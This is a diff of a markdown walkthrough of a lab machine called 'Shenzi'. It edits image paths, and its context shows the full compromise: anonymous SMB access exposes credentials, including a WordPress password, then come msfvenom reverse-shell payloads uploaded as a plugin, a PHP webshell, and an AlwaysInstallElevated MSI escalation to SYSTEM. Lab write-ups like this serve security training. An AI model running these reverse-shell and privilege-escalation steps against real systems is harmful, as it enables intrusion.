@@ -34,7 +34,6 @@ IP:  192.168.142.55
 
 ## Improved skills
 - Wordpress site/webpage directory guessing
-- skill 2
 
 ## Used tools
 - nmap
@@ -178,33 +177,33 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "echo exit | smbclient -L \\\\192.168.142.55" and found Shenzi as a share:
 
-![](Pasted%20image%2020221108005630.png)
+![](Images/Pasted%20image%2020221108005630.png)
 #SMBenumeration
 
 #### -Typed "smbclient \\\\192.168.142.55\\Shenzi" and hit enter/ left workgroup password blank and was able to gain access to the smb share and found a file named "password.txt":
 
-![](Pasted%20image%2020221108005828.png)
+![](Images/Pasted%20image%2020221108005828.png)
 
 
 #### -Typed "get password.txt" which downloaded the file to my kali machine
 
 #### -Cat'd the password file and found the following credentials
 
-![](Pasted%20image%2020221108010923.png)
+![](Images/Pasted%20image%2020221108010923.png)
 
 # Port 80 Apache httpd 2.4.43
 
 #### -As the SMB share was named "Shenzi" I navigated to "http://192.168.142.55/shenzi/" and found the following wordpress site:
 
-![](Pasted%20image%2020221108011213.png)
+![](Images/Pasted%20image%2020221108011213.png)
 
 #### - Typed "http://192.168.142.55/shenzi/admin" and was redirected to the following wordpress login page:
 
-![](Pasted%20image%2020221108011314.png)
+![](Images/Pasted%20image%2020221108011314.png)
 
 #### -Logged in with the wordpress credentials found previously (password FeltHeadwallWight357) and navigated to the plugins page:
 
-![](Pasted%20image%2020221108011438.png)
+![](Images/Pasted%20image%2020221108011438.png)
 
 
 
@@ -216,54 +215,54 @@ Enumerated top 200 UDP ports:
 
 #### -Clicked "add new":
 
-![](Pasted%20image%2020221108095524.png)
+![](Images/Pasted%20image%2020221108095524.png)
 
 #### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=445 -f exe > reverse.exe" to create the reverse shell payload on my kali machine:
 
-![](Pasted%20image%2020221108095611.png)
+![](Images/Pasted%20image%2020221108095611.png)
 
 #### - Started a netcat listener on my kali machine on port 445
 
 #### -Clicked "upload plugin":
 
-![](Pasted%20image%2020221108095717.png)
+![](Images/Pasted%20image%2020221108095717.png)
 
 #### -Clicked "browse" and chose my reverse shell payload on kali machine to upload and clicked "install now":
 
-![](Pasted%20image%2020221108095817.png)
+![](Images/Pasted%20image%2020221108095817.png)
 
-![](Pasted%20image%2020221108095901.png)
+![](Images/Pasted%20image%2020221108095901.png)
 
-![](Pasted%20image%2020221108095931.png)
+![](Images/Pasted%20image%2020221108095931.png)
 
 #### - As I know directory "/wp-content/uploads" is a common directory to have access to, I navigated to it and found the following:
 
-![](Pasted%20image%2020221108100355.png)
+![](Images/Pasted%20image%2020221108100355.png)
 
 #### - Clicked on "2022/"
 
-![](Pasted%20image%2020221108100456.png)
+![](Images/Pasted%20image%2020221108100456.png)
 
 #### -Clicked on "07/"
 
-![](Pasted%20image%2020221108100540.png)
+![](Images/Pasted%20image%2020221108100540.png)
 
 #### -Found my reverse shell payload. Set up a netcat listener on my kali machine listening on port 445 and clicked on the payload
 
-![](Pasted%20image%2020221108100619.png)
+![](Images/Pasted%20image%2020221108100619.png)
 
 #### - I was unable to execute the reverse shell from there so I downloaded a windows webshell found from https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php and typed "whoami" and found we had remote code execution:
 
-![](Pasted%20image%2020221108100715.png)
+![](Images/Pasted%20image%2020221108100715.png)
 
-![](Pasted%20image%2020221108100749.png)
+![](Images/Pasted%20image%2020221108100749.png)
 #PHPwebshell 
 
 #### - Typed "dir" and found our payload reverse.exe-.php was in the current directory. Then typed "reverse.exe_.php" and received a reverse shell:
 
-![](Pasted%20image%2020221108100845.png)
+![](Images/Pasted%20image%2020221108100845.png)
 
-![](Pasted%20image%2020221108100919.png)
+![](Images/Pasted%20image%2020221108100919.png)
 
 ---
 
@@ -274,23 +273,23 @@ Enumerated top 200 UDP ports:
 
 #### - Typed powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" on CMD prompt to run the "PrivescCheck.ps1" script and received the following Report showing "AlwaysInstallElevated" as High:
 
-![](Pasted%20image%2020221108101505.png)
+![](Images/Pasted%20image%2020221108101505.png)
 
-![](Pasted%20image%2020221108101625.png)
+![](Images/Pasted%20image%2020221108101625.png)
 #PrivescCheck.ps1
 
 #### - Reviewed the content of the script output and found the value of AlwaysInstallElevated in Local Machine and Current Users keys (also ran WinPeas to confirm this as well):
 
-![](Pasted%20image%2020221108101801.png)
+![](Images/Pasted%20image%2020221108101801.png)
 
-![](Pasted%20image%2020221108103449.png)
+![](Images/Pasted%20image%2020221108103449.png)
 #AlwaysInstallElevatedPrivilegeEscalation
 
 #### - Googled "alwayinstallelevated privilege escalation" and found the following webpage showing how to create a reverse shell payload. I typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=443 -f msi > installer.msi" to create the payload on my kali machine:
 
-![](Pasted%20image%2020221108103544.png)
+![](Images/Pasted%20image%2020221108103544.png)
 
-![](Pasted%20image%2020221108103623.png)
+![](Images/Pasted%20image%2020221108103623.png)
 
 
 
@@ -303,6 +302,6 @@ Enumerated top 200 UDP ports:
 
 #### - Per the "Windows Privelege Escalation (alwaysinstalleleveated)" webpage I typed "msiexec /quiet /qn /i [file name]" to run the reverse shell payload onto the target and received a shell running as NT/Authority System:
 
-![](Pasted%20image%2020221108104125.png)
+![](Images/Pasted%20image%2020221108104125.png)
 
 ---
